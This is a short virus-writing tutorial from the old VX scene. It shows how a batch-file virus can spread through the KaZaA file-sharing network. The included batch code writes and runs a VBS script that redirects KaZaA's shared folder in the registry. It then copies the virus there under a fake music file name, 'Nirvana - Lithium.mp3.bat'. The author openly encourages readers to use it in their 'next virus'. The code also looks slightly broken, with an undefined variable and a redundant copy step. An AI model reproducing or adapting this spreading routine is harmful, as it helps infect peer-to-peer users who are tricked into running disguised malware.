Kazaa Spreading via bat

In this article I'll show you, how to spread via KaZaA. KaZaA use a registry key named HKEY_CURRENT_USER\Software\Kazaa\Transfer The standard is "DlDir0"="C:\program files\my shared folder\" Every KaZaA user can download the files in that directory, also the virus. Now you have make a new key and copy the virus in that directory.

KaZaA-spreading Source
copy %0 C:\regkey.vbs
echo.on error resume next > C:\regkey.vbs
echo set ws = CreateObject("wscript.shell") >> C:\regkey.vbs
echo ws.regwrite "HKLM\Software\KaZaA\Transfer\DlDir0","%windir%\KaZaA\" >> C:\regkey.vbs
cscript C:\regkey.vbs
del C:\regkey.vbs
md %windir%\KaZaA
copy %MyS% %windir%\KaZaA\Nirvana - Lithium.mp3.bat

I hope, i could help you and you use this information in you next virus ;-)!

greets,
SeCoNd PaRt To HeLl
www.spth.de.vu
spth@jet2web.cc
PS: A big thanks to VorteX for explain me KaZaA spreading... 
explain me KaZaA spreading... 
